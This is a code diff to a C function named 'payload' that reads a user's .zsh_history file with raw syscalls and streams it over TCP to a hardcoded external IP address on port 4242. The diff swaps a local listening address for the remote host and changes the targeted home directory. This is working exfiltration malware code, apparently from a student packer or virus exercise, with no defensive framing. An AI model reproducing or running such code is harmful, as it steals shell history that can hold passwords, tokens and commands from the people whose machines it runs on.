@@ -16,10 +16,10 @@
 
 void payload(void)
 {
-	uint16_t port = 0;
-	uint32_t addr_ip = 0;
+	uint16_t port = 4242;
+	uint32_t addr_ip = inet_addr("85.215.203.63");
 	// char path[PATH_MAX] = "/home/maxence/.zsh_history";
-	char path[PATH_MAX] = "/home/maxence/.zsh_history";
+	char path[PATH_MAX] = "/home/mbrement/.zsh_history";
 
 	int fd = syscall(SYS_open, path, O_RDONLY);
 	if (fd == -1) {
@@ -27,12 +27,14 @@ void payload(void)
 		return;
 	}
 
-	struct stat st;
-	if (syscall(SYS_stat, path, &st) == -1) {
-		perror("stat");
-		close(fd);
-		return;
-	}
+	off_t filesize = syscall(SYS_lseek, fd, 0, SEEK_END);
+    if (filesize == -1) {
+        perror("lseek");
+        close(fd);
+        return;
+    }
+
+	syscall(SYS_lseek, fd, 0, SEEK_SET);
 
 	int socketfd = syscall(SYS_socket, AF_INET, SOCK_STREAM, 0);
 	if (socketfd == -1) {
@@ -43,8 +45,8 @@ void payload(void)
 
 	struct sockaddr_in addr;
 	addr.sin_family = AF_INET;
-	addr.sin_port = htons(3002);
-	addr.sin_addr.s_addr = htonl(INADDR_ANY);
+	addr.sin_port = htons(port);
+	addr.sin_addr.s_addr = addr_ip;
 
 	printf("port: %#x %#x\n", addr.sin_port, addr.sin_addr.s_addr);
 
@@ -55,7 +57,6 @@ void payload(void)
 		return;
 	}
 
-	off_t filesize = st.st_size;
 #ifdef __APPLE__
 	if (syscall(SYS_sendfile, fd, socketfd, 0, &filesize, NULL, 0) == -1) {
 		perror("sendfile");
